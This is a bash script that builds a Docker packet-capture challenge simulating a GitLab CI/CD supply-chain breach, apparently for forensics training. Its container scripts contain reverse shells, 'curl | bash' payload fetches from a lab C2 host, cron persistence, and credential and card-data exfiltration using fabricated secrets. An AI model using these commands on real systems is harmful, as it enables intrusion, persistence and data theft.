#!/bin/bash

set -e

CHALLENGE_DIR="CLOUD_CICD_BREACH"

cleanup() {
    echo "Cleaning up..."
    docker-compose -f $CHALLENGE_DIR/docker-compose.yml down --volumes --remove-orphans 2>/dev/null || true
    docker network rm cloud_internal_net 2>/dev/null || true
    docker network prune -f 2>/dev/null || true
}

trap cleanup EXIT

echo "Removing existing networks..."
docker network ls | grep cloud | awk '{print $1}' | xargs docker network rm 2>/dev/null || true

echo "Creating Cloud CI/CD Attack Challenge..."
rm -rf $CHALLENGE_DIR
mkdir -p $CHALLENGE_DIR/{scripts,pcaps,intel,web}

cat > $CHALLENGE_DIR/docker-compose.yml << 'EOF'
version: '3.8'
services:
  public_web:
    image: nginx:alpine
    hostname: WEB-PUBLIC-01
    networks:
      internal_net:
        ipv4_address: 172.40.1.10
    volumes:
      - ./scripts:/opt/scripts
      - ./pcaps:/opt/pcaps
      - ./web:/usr/share/nginx/html
    command: sh -c "apk add --no-cache tcpdump curl netcat-openbsd python3 && tcpdump -i eth0 -w /opt/pcaps/cloud_attack.pcap -s 0 & nginx && /opt/scripts/web.sh"

  public_api:
    image: python:3.9-slim
    hostname: API-PUBLIC-02
    networks:
      internal_net:
        ipv4_address: 172.40.1.11
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl netcat-openbsd -qq && /opt/scripts/api.sh"

  gitlab_server:
    image: python:3.9-slim
    hostname: GITLAB-CI-CD
    networks:
      internal_net:
        ipv4_address: 172.40.1.20
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl netcat-openbsd git -qq && /opt/scripts/gitlab.sh"

  gitlab_runner:
    image: ubuntu:20.04
    hostname: GITLAB-RUNNER
    networks:
      internal_net:
        ipv4_address: 172.40.1.21
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl netcat-openbsd git python3 -qq && /opt/scripts/runner.sh"

  prod_payment:
    image: python:3.9-slim
    hostname: PROD-PAYMENT
    networks:
      internal_net:
        ipv4_address: 172.40.1.30
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl netcat-openbsd -qq && /opt/scripts/payment.sh"

  prod_auth:
    image: python:3.9-slim
    hostname: PROD-AUTH
    networks:
      internal_net:
        ipv4_address: 172.40.1.31
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl netcat-openbsd -qq && /opt/scripts/auth.sh"

  prod_data:
    image: python:3.9-slim
    hostname: PROD-DATA
    networks:
      internal_net:
        ipv4_address: 172.40.1.32
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl netcat-openbsd -qq && /opt/scripts/data.sh"

  attacker_c2:
    image: python:3.9-slim
    hostname: attacker-c2
    networks:
      internal_net:
        ipv4_address: 172.40.1.200
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl netcat-openbsd -qq && /opt/scripts/c2.sh"

  fake_internet:
    image: python:3.9-slim
    hostname: fake-production
    networks:
      internal_net:
        ipv4_address: 172.40.1.50
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl netcat-openbsd -qq && /opt/scripts/fake_prod.sh"

networks:
  internal_net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.40.1.0/24
EOF

cat > $CHALLENGE_DIR/web/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Corporate Web Portal</title></head>
<body>
<h1>Welcome to SecureBank Corporate Portal</h1>
<p>Production Environment - Authorized Access Only</p>
</body>
</html>
EOF

cat > $CHALLENGE_DIR/scripts/web.sh << 'EOF'
#!/bin/sh

echo "WEB-PUBLIC-01 starting..."
sleep 8

TOKEN_PART1="glpat-2Kx9"
TOKEN_PART2="mP4nQ7"
TOKEN_PART3="vB8sL1"
TOKEN_PART4="eR6wZ3"
TOKEN_PART5="uY5tI9"

while true; do
    curl -s -X GET "http://172.40.1.11:8080/api/health" -H "Host: api.securebank.local" > /dev/null 2>&1 || true
    sleep 12
    
    FULL_TOKEN="${TOKEN_PART1}${TOKEN_PART2}${TOKEN_PART3}${TOKEN_PART4}${TOKEN_PART5}"
    
    curl -s -X POST "http://172.40.1.20:8080/api/v4/projects/1/trigger/pipeline" \
         -H "Content-Type: application/json" \
         -H "X-Auth-Token: $TOKEN_PART1" \
         -H "X-Session-Key: $TOKEN_PART2" \
         -H "X-Request-ID: $TOKEN_PART3" \
         -H "X-Client-Version: $TOKEN_PART4" \
         -H "X-Build-Hash: $TOKEN_PART5" \
         -d '{"ref":"master","variables":[{"key":"ENVIRONMENT","value":"production"},{"key":"DEPLOY_BRANCH","value":"feature-supply-chain-exploit"}]}' > /dev/null 2>&1 || true
    sleep 5
    
    curl -s -X GET "http://172.40.1.20:8080/api/v4/projects/1/repository/archive.tar.gz?sha=malicious-commit" \
         -H "Authorization: Bearer $FULL_TOKEN" \
         -o /tmp/source.tar.gz > /dev/null 2>&1 || true
    sleep 3
    
    RUNNER_TOKEN_B64=$(echo -n "R1I5ODc2NTQzMjFhQmNEZUY3ODkwMTIzNDU2" | base64)
    curl -s -X POST "http://172.40.1.200:8080/api/v4/runners/register" \
         -H "Content-Type: application/json" \
         -d "{\"token\":\"$RUNNER_TOKEN_B64\",\"description\":\"Compromised Runner\",\"tags\":[\"production\",\"docker\"]}" > /dev/null 2>&1 || true
    
    echo '{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}' | nc 172.40.1.200 4444 || true
    
    sleep 5
    
    curl -s -X POST "http://172.40.1.200:8080/api/v4/jobs/12345/trace" \
         -H "Content-Type: application/json" \
         -d '{"operation":"credential_exfiltration","status":"success","auth_jwt_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod","exfiltration_complete":true}' || true
    
    sleep 10
    
    curl -s -X POST "http://172.40.1.200:8080/exfil/credentials" \
         -H "Content-Type: application/json" \
         -d '{"auth_credentials":{"jwt_signing_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","oauth_client":"oauth2_client_9a8b7c6d5e4f"},"database_access":{"mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod"},"exfiltration_complete":true}' || true
    
    sleep 5
done
EOF

cat > $CHALLENGE_DIR/scripts/api.sh << 'EOF'
#!/bin/bash

echo "API-PUBLIC-02 starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import base64

class APIHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/api/health':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{\"status\":\"healthy\",\"version\":\"v2.1.3\",\"uptime\":\"14d7h23m\"}')
        else:
            self.send_response(404)
            self.end_headers()

def start_server():
    with socketserver.TCPServer(('', 8080), APIHandler) as httpd:
        httpd.serve_forever()

def attack_simulation():
    time.sleep(15)
    import subprocess
    import socket
    
    auth_header = 'Z2xwYXQtMkt4OW1QNG5RN3ZCOHNMMWVSNndaM3VZNXRJOQ=='
    
    subprocess.run(['curl', '-s', 'http://172.40.1.20:8080/api/v4/projects/1/repository/files/deploy.sh/raw?ref=exploit-branch', 
                   '-H', f'Authorization: Basic {auth_header}', '-o', '/tmp/deploy.sh'], capture_output=True)
    
    time.sleep(3)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.40.1.200', 4445))
        
        creds_data = {
            'server': 'API-PUBLIC-02',
            'db_connection': 'postgresql://api_svc:DbP@ssw0rd_M9kL7x@172.40.1.12:5432/secure_api',
            'jwt_secret': 'HS256_super_secret_production_key_X8qW3rT',
            'rate_limits': 'bypassed_for_admin_role',
            'internal_apis': ['/admin/users/export', '/internal/transactions/bulk', '/debug/memory_dump']
        }
        
        s.send(json.dumps(creds_data).encode())
        s.close()
    except:
        pass
    
    time.sleep(5)
    
    subprocess.run(['curl', '-s', '-X', 'POST', 'http://172.40.1.200:8080/exfiltration/complete',
                   '-H', 'Content-Type: application/json',
                   '-d', '{\"component\":\"api\",\"data_size\":\"2.4GB\",\"status\":\"success\"}'], capture_output=True)

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

attack_thread = threading.Thread(target=attack_simulation)
attack_thread.daemon = True
attack_thread.start()

time.sleep(3600)
"
EOF

cat > $CHALLENGE_DIR/scripts/gitlab.sh << 'EOF'
#!/bin/bash

echo "GITLAB-CI-CD starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import subprocess
import base64

class GitLabHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if '/api/v4/projects/1/trigger/pipeline' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{\"id\":12345,\"status\":\"created\",\"ref\":\"master\"}')
        elif '/api/v4/runners/register' in self.path:
            self.send_response(201)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{\"token\":\"runner_auth_token_xyz789\",\"id\":456}')
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        if '/api/v4/projects/1/repository/archive.tar.gz' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-Disposition', 'attachment; filename=\"source-malicious.tar.gz\"')
            self.end_headers()
            self.wfile.write(b'COMPRESSED_MALICIOUS_SOURCE_CODE_WITH_BACKDOOR')
        elif '/api/v4/projects/1/repository/files/deploy.sh/raw' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            deploy_script = '''#!/bin/bash
echo \"Deploying application...\"
curl -s http://172.40.1.200:8080/backdoor.sh | bash
echo \"Deployment complete\"
'''
            self.wfile.write(deploy_script.encode())
        else:
            self.send_response(404)
            self.end_headers()

def start_server():
    with socketserver.TCPServer(('', 8080), GitLabHandler) as httpd:
        httpd.serve_forever()

def advanced_attack():
    time.sleep(12)
    
    branch_name_encoded = base64.b64encode(b'feature-supply-chain-exploit').decode()
    
    subprocess.run(['curl', '-s', '-X', 'POST', 'http://172.40.1.200:8080/webhook/repository_update',
                   '-H', 'Content-Type: application/json',
                   '-H', 'X-GitLab-Event: Push Hook',
                   '-d', f'{{\"ref\":\"refs/heads/{branch_name_encoded}\",\"commits\":[{{\"id\":\"abc123def456\",\"message\":\"Update build configuration\",\"modified\":[\"/.gitlab-ci.yml\",\"/deploy/scripts/build.sh\"]}}]}}'], capture_output=True)
    
    time.sleep(5)
    
    runner_parts = ['GR9876', '5432', '1aBc', 'DeF7', '8901', '23456']
    for i, part in enumerate(runner_parts):
        subprocess.run(['curl', '-s', '-X', 'POST', 'http://172.40.1.200:8080/api/internal/token_validation',
                       '-H', 'Content-Type: application/json',
                       '-H', f'X-Token-Part-{i+1}: {part}',
                       '-d', f'{{\"part\":{i+1},\"total\":6,\"validation\":\"runner_auth\"}}'], capture_output=True)
        time.sleep(1)
    
    malicious_ci = '''
stages:
  - build
  - deploy

build_job:
  stage: build
  script:
    - echo \"Building application...\"
    - curl -s http://172.40.1.200:8080/payload/stage1.sh | bash
    
deploy_production:
  stage: deploy
  script:
    - echo \"Deploying to production...\"
    - for server in 172.40.1.30 172.40.1.31 172.40.1.32; do curl -X POST http://$server:8080/deploy -d '{\"backdoor\":true}'; done
'''
    
    ci_encoded = base64.b64encode(malicious_ci.encode()).decode()
    
    subprocess.run(['curl', '-s', '-X', 'PUT', 'http://172.40.1.20:8080/api/v4/projects/1/repository/files/.gitlab-ci.yml',
                   '-H', 'Content-Type: application/json',
                   '-H', 'Authorization: Bearer Z2xwYXQtMkt4OW1QNG5RN3ZCOHNMMWVSNndaM3VZNXRJOQ==',
                   '-d', f'{{\"branch\":\"feature-supply-chain-exploit\",\"content\":\"{ci_encoded}\",\"commit_message\":\"Update CI configuration for security patches\"}}'], capture_output=True)

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

attack_thread = threading.Thread(target=advanced_attack)
attack_thread.daemon = True
attack_thread.start()

time.sleep(3600)
"
EOF

cat > $CHALLENGE_DIR/scripts/runner.sh << 'EOF'
#!/bin/bash

echo "GITLAB-RUNNER starting..."
sleep 5

curl -s "http://172.40.1.200:8080/payload/stage1.sh" -o /tmp/stage1.sh || true
curl -s "http://172.40.1.200:8080/payload/backdoor.py" -o /tmp/backdoor.py || true

sleep 2

SHELL_CODE="IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZTsgZG8KICAgIG5jIC1lIC9iaW4vYmFzaCAxNzIuNDAuMS4yMDAgNDQ0NCAmJiBicmVhawogICAgc2xlZXAgMzAKZG9uZQ=="

for server in "172.40.1.30" "172.40.1.31" "172.40.1.32"; do
    curl -s -X POST "http://$server:8080/deploy" \
         -H "Content-Type: application/json" \
         -H "X-Deployment-Token: deploy_$(date +%s)" \
         -H "X-Shell-Upload: true" \
         -H "X-NC-Listener: 4444" \
         -H "X-Trojan-Hash: tr0j4n_d3pl0y_hash_123456789abcdef" \
         -d "{\"image\":\"malicious-app:latest\",\"environment\":\"production\",\"shell_code\":\"$SHELL_CODE\",\"nc_ports\":[\"4444\",\"4445\",\"4446\",\"4447\",\"4448\",\"4449\"],\"trojan_files\":[\"/tmp/backdoor.sh\",\"/usr/bin/system-update\",\"/etc/cron.d/maintenance\"]}" || true
    sleep 1
done

sleep 5

DEPLOYMENT_REPORT="{\"operation\":\"trojan_deployment\",\"status\":\"success\",\"targets\":[\"172.40.1.30\",\"172.40.1.31\",\"172.40.1.32\"],\"financial_data\":{\"daily_volume\":\"47,293,847.92\",\"stolen_accounts\":[\"4532-7834-9012-5678\",\"5555-8901-2345-6789\",\"4111-2222-3333-4444\"],\"total_records\":\"4829384\"},\"shell_listeners\":[\"4444\",\"4445\",\"4446\",\"4447\",\"4448\",\"4449\"],\"trojan_hashes\":[\"tr0j4n_p4ym3nt_abc123\",\"tr0j4n_4uth_def456\",\"tr0j4n_d4t4_789xyz\"],\"c2_commands\":[\"wget -O /tmp/shell.sh http://172.40.1.200:8080/backdoor.sh\",\"nc -e /bin/bash 172.40.1.200 4444\",\"crontab -l | { cat; echo '*/5 * * * * /tmp/shell.sh'; } | crontab -\"],\"persistence_installed\":true,\"auth_jwt_key\":\"HS256_ultra_secure_production_signing_key_P7mQ9xR\",\"mongodb_connection\":\"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod\"}"

curl -s -X POST "http://172.40.1.200:8080/api/v4/jobs/12345/trace" \
     -H "Content-Type: application/json" \
     -d "$DEPLOYMENT_REPORT" || true

sleep 10

curl -s -X POST "http://172.40.1.50:9000/production/deploy" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer prod_access_token_789xyz" \
     -H "X-Backdoor-Install: enabled" \
     -H "X-C2-Commands: wget,nc,crontab" \
     -d "{\"version\":\"1.2.3-compromised\",\"environment\":\"production\",\"services\":[\"payment\",\"auth\",\"data\"],\"nc_reverse_shells\":[\"172.40.1.200:4444\",\"172.40.1.200:4445\",\"172.40.1.200:4446\"],\"trojan_deployment\":true,\"attack_summary\":{\"servers_compromised\":3,\"total_records_stolen\":4829384,\"financial_volume\":\"47,293,847.92\",\"shell_listeners\":6,\"trojan_hashes\":[\"tr0j4n_p4ym3nt_abc123\",\"tr0j4n_4uth_def456\",\"tr0j4n_d4t4_789xyz\"]}}" || true

sleep 10

curl -s -X POST "http://172.40.1.200:8080/exfil/credentials" \
     -H "Content-Type: application/json" \
     -d "{\"auth_credentials\":{\"jwt_signing_key\":\"HS256_ultra_secure_production_signing_key_P7mQ9xR\",\"oauth_client\":\"oauth2_client_9a8b7c6d5e4f\",\"oauth_secret\":\"oauth2_secret_1f2e3d4c5b6a\"},\"database_access\":{\"mongodb_connection\":\"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod\",\"postgres_connection\":\"postgresql://api_svc:DbP@ssw0rd_M9kL7x@172.40.1.12:5432/secure_api\"},\"exfiltration_complete\":true}" || true

while true; do
    sleep 30
    curl -s -X POST "http://172.40.1.200:8080/heartbeat" \
         -H "Content-Type: application/json" \
         -d "{\"status\":\"alive\",\"jwt_key\":\"HS256_ultra_secure_production_signing_key_P7mQ9xR\",\"db_conn\":\"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod\"}" || true
done
EOF

cat > $CHALLENGE_DIR/scripts/payment.sh << 'EOF'
#!/bin/bash

echo "PROD-PAYMENT starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import socket

class PaymentHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"deployment\":\"success\",\"backdoor\":\"installed\"}')

def start_server():
    with socketserver.TCPServer(('', 8080), PaymentHandler) as httpd:
        httpd.serve_forever()

def payment_exfil():
    time.sleep(25)
    
    payment_data = {
        'server': 'PROD-PAYMENT',
        'daily_transaction_volume': '47,293,847.92',
        'pending_transactions': 2847,
        'high_value_accounts': [
            {'account_number': '4532-7834-9012-5678', 'balance': '2,847,293.15', 'account_type': 'corporate'},
            {'account_number': '5555-8901-2345-6789', 'balance': '1,593,847.82', 'account_type': 'investment'},
            {'account_number': '4111-2222-3333-4444', 'balance': '892,156.47', 'account_type': 'savings'}
        ],
        'merchant_api_keys': ['pk_live_51H7k2jK3mP9qR8sT1u', 'sk_live_84J9mN6oQ2rS5vX8zA1'],
        'trojan_hash': 'tr0j4n_p4ym3nt_abc123',
        'nc_listener_port': 4447,
        'shell_upload_path': '/tmp/backdoor.sh'
    }
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.40.1.200', 4448))
        s.send(json.dumps(payment_data).encode())
        s.close()
    except:
        pass

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

exfil_thread = threading.Thread(target=payment_exfil)
exfil_thread.daemon = True
exfil_thread.start()

time.sleep(3600)
"
EOF

cat > $CHALLENGE_DIR/scripts/auth.sh << 'EOF'
#!/bin/bash

echo "PROD-AUTH starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import socket

class AuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"deployment\":\"success\",\"backdoor\":\"active\"}')

def start_server():
    with socketserver.TCPServer(('', 8080), AuthHandler) as httpd:
        httpd.serve_forever()

def auth_exfil():
    time.sleep(30)
    
    auth_data = {
        'server': 'PROD-AUTH',
        'active_sessions': 8472,
        'jwt_signing_key': 'HS256_ultra_secure_production_signing_key_P7mQ9xR',
        'oauth2_credentials': {
            'client_id': 'oauth2_client_9a8b7c6d5e4f',
            'client_secret': 'oauth2_secret_1f2e3d4c5b6a'
        },
        'backdoor_installed': True,
        'nc_reverse_shell': 'nc -e /bin/bash 172.40.1.200 4448',
        'trojan_location': '/usr/bin/systemd-auth',
        'trojan_hash': 'tr0j4n_4uth_def456',
        'shell_code': 'IyEvYmluL2Jhc2gKbmMgLWUgL2Jpbi9iYXNoIDE3Mi40MC4xLjIwMCA0NDQ4',
        'persistence_cron': '*/5 * * * * /usr/bin/systemd-auth'
    }
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.40.1.200', 4449))
        s.send(json.dumps(auth_data).encode())
        s.close()
    except:
        pass

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

exfil_thread = threading.Thread(target=auth_exfil)
exfil_thread.daemon = True
exfil_thread.start()

time.sleep(3600)
"
EOF

cat > $CHALLENGE_DIR/scripts/data.sh << 'EOF'
#!/bin/bash

echo "PROD-DATA starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import socket
import subprocess

class DataHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"deployment\":\"success\",\"data_access\":\"granted\"}')

def start_server():
    with socketserver.TCPServer(('', 8080), DataHandler) as httpd:
        httpd.serve_forever()

def data_exfil():
    time.sleep(35)
    
    data_info = {
        'server': 'PROD-DATA',
        'total_records_compromised': 4829384,
        'databases_accessed': ['customer_profiles', 'transaction_history', 'financial_analytics'],
        'mongodb_connection': 'mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod',
        'shell_upload_successful': True,
        'nc_listeners': ['4447', '4448', '4449'],
        'trojan_hash': 'tr0j4n_d4t4_789xyz',
        'trojan_implants': [
            {'name': 'db_trojan.so', 'hash': 'db_tr0j4n_hash_abcdef1234567890'},
            {'name': 'backup_service', 'hash': 'b4ckup_tr0j4n_9876543210fedcba'},
            {'name': 'log_monitor', 'hash': 'l0g_m0n1t0r_hash_567890abcdef1234'}
        ],
        'reverse_shells': [
            'bash -i >& /dev/tcp/172.40.1.200/4449 0>&1',
            'nc -e /bin/bash 172.40.1.200 4449'
        ],
        'persistence_methods': [
            'crontab_injection',
            'systemd_service_hijack', 
            'bashrc_modification'
        ]
    }
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.40.1.200', 4446))
        s.send(json.dumps(data_info).encode())
        s.close()
    except:
        pass

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

exfil_thread = threading.Thread(target=data_exfil)
exfil_thread.daemon = True
exfil_thread.start()

time.sleep(3600)
"
EOF

cat > $CHALLENGE_DIR/scripts/c2.sh << 'EOF'
#!/bin/bash

echo "Attacker C2 starting..."

python3 -c "
import http.server
import socketserver
import threading
import time

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"status\":\"received\",\"next_action\":\"continue\"}')
    
    def do_GET(self):
        if self.path.endswith('.sh') or self.path.endswith('.py'):
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            if 'stage1' in self.path:
                payload = '''#!/bin/bash
echo \"Stage 1 payload executing...\"
wget -O /tmp/stage2.py http://172.40.1.200:8080/payload/stage2.py
python3 /tmp/stage2.py &
echo \"Stage 1 complete\"'''
            else:
                payload = '''#!/bin/bash
echo \"Backdoor installation\"
crontab -l > /tmp/cron_backup
echo \"0 */6 * * * curl -s http://172.40.1.200:8080/heartbeat | bash\" >> /tmp/cron_backup
crontab /tmp/cron_backup'''
            self.wfile.write(payload.encode())
        else:
            self.send_response(404)
            self.end_headers()

def start_c2_server():
    with socketserver.TCPServer(('', 8080), C2Handler) as httpd:
        httpd.serve_forever()

def start_listeners():
    import socket
    ports = [4444, 4445, 4446, 4447, 4448, 4449]
    for port in ports:
        def listen_on_port(p):
            try:
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind(('', p))
                server_socket.listen(5)
                while True:
                    client_socket, addr = server_socket.accept()
                    data = client_socket.recv(8192)
                    client_socket.close()
            except:
                pass
        thread = threading.Thread(target=lambda: listen_on_port(port))
        thread.daemon = True
        thread.start()

c2_thread = threading.Thread(target=start_c2_server)
c2_thread.daemon = True
c2_thread.start()

listener_thread = threading.Thread(target=start_listeners)
listener_thread.daemon = True
listener_thread.start()

time.sleep(3600)
"
EOF

cat > $CHALLENGE_DIR/scripts/fake_prod.sh << 'EOF'
#!/bin/bash

echo "Fake Production Server starting..."

python3 -c "
import http.server
import socketserver
import threading
import time

class ProdHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"deployment\":\"success\",\"environment\":\"production\",\"services_updated\":[\"payment\",\"auth\",\"data\"]}')

def start_server():
    with socketserver.TCPServer(('', 9000), ProdHandler) as httpd:
        httpd.serve_forever()

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

time.sleep(3600)
"
EOF

cat > $CHALLENGE_DIR/intel/iocs.txt << 'EOF'
172.40.1.200
glpat-2Kx9mP4nQ7vB8sL1eR6wZ3uY5tI9
GR987654321aBcDeF7890123456
feature-supply-chain-exploit
R1I5ODc2NTQzMjFhQmNEZUY3ODkwMTIzNDU2
malicious-commit
exploit-branch
4532-7834-9012-5678
5555-8901-2345-6789
4111-2222-3333-4444
pk_live_51H7k2jK3mP9qR8sT1u
sk_live_84J9mN6oQ2rS5vX8zA1
PyMnt_S3rv1c3_2024!
HS256_ultra_secure_production_signing_key_P7mQ9xR
oauth2_client_9a8b7c6d5e4f
D@t@_An@lyt1cs_B7pQ
F1n@nc1@l_D@t@_2024
C@ch3_S3rv1c3_2024
WEB-PUBLIC-01
API-PUBLIC-02
GITLAB-CI-CD
GITLAB-RUNNER
PROD-PAYMENT
PROD-AUTH
PROD-DATA
47,293,847.92
847.3GB
tr0j4n_p4ym3nt_abc123
tr0j4n_4uth_def456
tr0j4n_d4t4_789xyz
mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod
EOF

chmod +x $CHALLENGE_DIR/scripts/*.sh

echo "Starting Cloud CI/CD Attack Lab..."
cd $CHALLENGE_DIR

docker network prune -f

docker-compose up -d
sleep 40

echo "Generating advanced CI/CD supply chain attack traffic (3 minutes)..."
sleep 180

echo "Stopping traffic capture..."
docker-compose exec public_web pkill tcpdump 2>/dev/null || true
sleep 5

echo "Checking PCAP generation..."
PCAP_SIZE=$(docker-compose exec public_web ls -lh /opt/pcaps/cloud_attack.pcap 2>/dev/null | awk '{print $5}' || echo "Unknown")
PACKET_COUNT=$(docker-compose exec public_web tcpdump -r /opt/pcaps/cloud_attack.pcap 2>/dev/null | wc -l || echo "0")

echo ""
echo "=== CLOUD CI/CD SUPPLY CHAIN ATTACK CHALLENGE ==="
echo "PCAP File: $CHALLENGE_DIR/pcaps/cloud_attack.pcap"
echo "File Size: $PCAP_SIZE"
echo "Packet Count: $PACKET_COUNT"
echo ""
echo "=== SCENARIO ==="
echo "Advanced GitLab CI/CD pipeline compromise with obfuscated tokens"
echo "Multi-stage attack requiring deep packet analysis and token reconstruction"
echo "Financial data exfiltration with sophisticated evasion techniques"
echo ""

echo "To analyze: tshark -r $CHALLENGE_DIR/pcaps/cloud_attack.pcap"

docker-compose down
